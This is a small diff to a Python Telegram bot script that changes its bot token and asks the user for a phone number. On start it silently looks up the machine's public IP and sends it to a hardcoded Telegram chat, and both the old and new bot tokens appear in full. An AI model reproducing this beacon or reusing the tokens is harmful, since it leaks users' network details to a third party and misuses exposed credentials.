@@ -3,7 +3,7 @@ from telebot import types
 import requests
 adrr = requests.get('https://ip.beget.ru').text
 ID = 1035726612
-bot = telebot.TeleBot("1815187102:AAGpSCYRjs_FIPaNOdi8MEbwRXk5pQM_UXQ")
+bot = telebot.TeleBot("1815187102:AAEXo2nl0Cx5-Ter27rFGtsGFWOQBuQ0zXw")
 bot.send_message(ID, f'''Online! \n Ip: {adrr}''') 
 numb = input("Введите номер телефона: ")
 markup_reply = types.ReplyKeyboardMarkup(resize_keyboard = True)
